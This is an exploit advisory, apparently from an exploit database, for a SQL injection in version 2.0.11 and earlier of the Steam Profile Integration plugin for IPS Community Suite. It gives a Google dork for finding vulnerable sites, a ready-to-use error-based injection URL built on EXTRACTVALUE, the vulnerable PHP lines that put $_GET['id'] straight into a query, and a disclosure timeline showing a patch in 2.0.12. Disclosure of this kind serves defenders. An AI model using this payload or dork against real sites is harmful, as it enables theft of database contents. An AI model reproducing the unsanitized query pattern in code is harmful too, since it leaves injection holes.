@@ -1,0 +1,34 @@
+# Exploit Title: IPS Community Suite - Steam Profile Integration 2.0.11 and below SQL injection
+# Google Dork: inurl:tab=node_steam_steamprofile
+# Date: 13/03/2017
+# Exploit Author: DrWhat
+# Vendor Homepage: https://invisionpower.com/files/file/8170-steam-profile-integration/
+# Software Link: https://invisionpower.com/files/file/8170-steam-profile-integration/
+# Version: 2.0.11 and below
+# Tested on: Windows Server 2008 PHP7 & Linux Debian PH5.6
+
+# SQL Injection/Exploit: http://localhost/path/index.php?app=steam&module=steam&section=steamProfile&do=update&id=[USER_WITH_STEAM]%' OR EXTRACTVALUE(1001,CONCAT(0x3A,([QUERY]),0x3A)) AND '%'='&csrfKey=[CSRF_KEY]
+
+
+# Vulnerable code: /sources/Update/Update.php updateProfile() function
+# 532: $ids = array();
+# 533: $steamids = '';
+# 534: $select = "s.st_member_id,s.st_steamid,s.st_restricted";
+# 535: $where = "s.st_steamid>0 AND s.st_restricted!='1'";
+# 536: if($single)
+# 537: {
+# 538:    $where .= " AND s.st_member_id='{$single}'"; // $single is $_GET['id'] pass through the router
+# 539:
+# 540:    /* Is the member already in the database ? */
+# 541:    $s = \IPS\steam\Profile::load($single); // IPS Profile model cleans the request and successfully executes the query
+
+
+# 573: $query = \IPS\Db::i()->select( $select, array('steam_profiles', 's'), $where, 's.st_member_id ASC', array( $this->extras['profile_offset'], 100), NULL, NULL, '011'); // Our payload is then later executed in the $where variable unsanitized
+
+
+# Timeline
+# 13/03/2017: Exploit discovered
+# 13/03/2017: Vendor notified
+# 14/03/2017: Vendor confirmed vulnerablity
+# 15/03/2017: Vendor releases patch 2.0.12
+# 15/03/2017: Public disclosure
